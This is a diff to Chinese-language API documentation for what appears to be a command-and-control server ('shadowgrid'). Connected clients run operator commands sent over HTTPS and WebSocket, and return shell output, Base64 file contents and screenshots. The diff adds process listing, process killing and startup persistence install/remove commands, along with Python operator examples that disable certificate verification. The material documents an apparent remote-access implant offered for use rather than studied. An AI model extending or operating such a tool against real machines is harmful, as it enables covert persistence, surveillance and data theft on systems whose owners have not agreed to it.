@@ -115,6 +115,70 @@ HTTP Status: `401`
 | `echo` | 要回显的文本 |
 | `time` | null |
 | `test` | null |
+| `ps` / `process` | null - 获取系统进程列表 |
+| `kill` / `terminate` | `{"pid": 进程ID}` - 结束指定进程 |
+| `persist` / `install` | `{"action": "install/remove", "path": 路径字符串}` - 系统持久化管理 |
+
+##### 新增功能: 进程管理
+
+1. **`ps`** 获取进程列表：
+```json
+{
+  "type": "ps"
+}
+```
+响应:
+```json
+{
+  "status": "ok",
+  "result": [
+    {"pid": 1234, "name": "notepad.exe", "username": "user", "status": "running"},
+    {"pid": 5678, "name": "python.exe", "username": "user", "status": "sleeping"}
+  ],
+  "result_type": "process_list"
+}
+```
+
+2. **`kill`** 结束进程:
+```json
+{
+  "type": "kill",
+  "payload": {
+    "pid": 1234
+  }
+}
+```
+响应:
+```json
+{
+  "status": "ok",
+  "result": "Process 1234 terminated successfully",
+  "result_type": "process_killed"
+}
+```
+
+##### 新增功能: 系统持久化
+
+1. **`persist` install** 系统自动启动:
+```json
+{
+  "type": "persist",
+  "payload": {
+    "action": "install",
+    "path": "/opt/shadowgrid"  # 可选路径参数
+  }
+}
+```
+
+2. **`persist` remove** 移除自启动:
+```json
+{
+  "type": "persist",
+  "payload": {
+    "action": "remove"
+  }
+}
+```
 
 #### 响应
 
@@ -152,7 +216,7 @@ HTTP Status: `401`
 }
 ```
 
-如果venience 为空，表示没有新结果。
+如果响应为空，表示没有新结果。
 
 ---
 
@@ -226,7 +290,7 @@ HTTP Status: `401`
 - `command_id`: 对应的命令ID
 - `result`: 命令执行结果
 
-### 结果类型
+### 增强的结果类型
 
 | result_type | result 格式说明 |
 |-------------|----------------|
@@ -235,6 +299,9 @@ HTTP Status: `401`
 | `file` | 文件内容 (Base64 编码)，带 `filename` 字段 |
 | `shell` | 命令输出字符串 |
 | `screenshot` | Base64 编码的图片，带 `filename` 字段 |
+| `process_list` | `{"pid": 进程ID, "name": 进程名, "username": 用户名, "status": 状态}` 数组 |
+| `process_killed` | 进程结束成功的字符串 |
+| `persistence` | 持久化操作状态字符串 |
 | `ok` | 成功消息字符串 |
 | `error` | 错误消息字符串 |
 
@@ -277,9 +344,20 @@ clients = response.json()["clients"]
 
 # 3. 发送命令
 client_id = clients[0]["id"]
+# 系统进程管理
 response = requests.post(
     f"https://server:8444/command/{client_id}",
-    json={"type": "ls", "payload": "/"},
+    json={"type": "ps"},  # 进程列表
+    verify=False
+)
+
+# 终止指定进程
+response = requests.post(
+    f"https://server:8444/command/{client_id}",
+    json={
+        "type": "kill",
+        "payload": {"pid": 1234}
+    },
     verify=False
 )
 
@@ -294,6 +372,7 @@ results = response.json()["results"]
 # WebSocket 连接示例
 import websocket
 import json
+import ssl
 
 def on_message(ws, message):
     msg = json.loads(message)
@@ -331,3 +410,5 @@ ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
 3. **命令队列**: 同一时间只允许一个 pending 命令
 4. **结果清除**: 获取结果后会清空结果队列
 5. **超时**: 客户端连接后 5 秒内必须发送 register 消息
+6. **新增功能**: 进程管理、持久化命令等新功能均通过同一接口实现
+7. **安全性**: 确保只有授权用户能够访问此API
